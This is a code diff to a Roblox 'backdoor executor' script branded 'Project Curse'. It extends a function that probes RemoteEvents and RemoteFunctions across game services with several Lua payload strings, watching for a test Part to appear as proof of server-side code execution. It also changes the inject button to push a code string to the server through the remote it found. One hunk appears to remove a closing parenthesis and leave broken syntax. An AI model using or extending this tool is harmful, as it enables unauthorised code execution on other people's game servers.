@@ -17,26 +17,32 @@ local function findBackdoor()
         return name
     end
     
-    for _, parent in ipairs({Workspace, ReplicatedStorage, game:GetService("Players"), game:GetService("Lighting"), game:GetService("ServerScriptService")}) do
+    for _, parent in ipairs({Workspace, ReplicatedStorage, game:GetService("Players"), game:GetService("Lighting"), game:GetService("ServerScriptService"), game:GetService("ServerStorage")}) do
         for _, remote in ipairs(parent:GetDescendants()) do
             if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
                 local testName = randomName(10)
-                local payload = 'local p = Instance.new("Part"); p.Name = "'..testName..'"; p.Parent = workspace; task.wait(0.5); p:Destroy()'
+                local payloads = {
+                    'local p = Instance.new("Part"); p.Name = "'..testName..'"; p.Parent = workspace; task.wait(0.5); p:Destroy()',
+                    'Instance.new("Part", workspace).Name = "'..testName..'"',
+                    'game:GetService("Workspace"):FindFirstChild("'..testName..'") or Instance.new("Part", workspace).Name = "'..testName..'"'
+                }
                 
-                local success = pcall(function()
-                    if remote:IsA("RemoteEvent") then
-                        remote:FireServer(payload)
-                    else
-                        remote:InvokeServer(payload)
-                    end
-                end)
-                
-                if success then
-                    task.wait(0.5)
-                    local check = Workspace:FindFirstChild(testName)
-                    if check then
-                        check:Destroy()
-                        return remote
+                for _, payload in ipairs(payloads) do
+                    local success = pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(payload)
+                        else
+                            remote:InvokeServer(payload)
+                        end
+                    end)
+                    
+                    if success then
+                        task.wait(0.7)
+                        local check = Workspace:FindFirstChild(testName)
+                        if check then
+                            check:Destroy()
+                            return remote
+                        end
                     end
                 end
             end
@@ -279,12 +285,13 @@ clear.MouseButton1Click:Connect(function()
 end)
 
 inject.MouseButton1Click:Connect(function()
- foundRemote = findBackdoor()
- if foundRemote then
-  injected = true
-  inject.Text = "Injected"
- else
-  inject.Text = "Inject"
+ if not injected then
+  foundRemote = findBackdoor()
+  if foundRemote then
+   injected = true
+   inject.Text = "Injected"
+   sendCode('local h = Instance.new("Hint"); h.Text = "Project Curse v2.4.6 we hope you enjoy this executor | Thank you for using."; h.Parent = workspace; task.wait(10); h:Destroy()')
+  end
  end
 end)
 
@@ -304,7 +311,7 @@ Frame.InputBegan:Connect(function(input)
    if input.UserInputState == Enum.UserInputState.End then
     dragging = false
    end
-  end)
+  end
  end
 end)
 Frame.InputChanged:Connect(function(input)
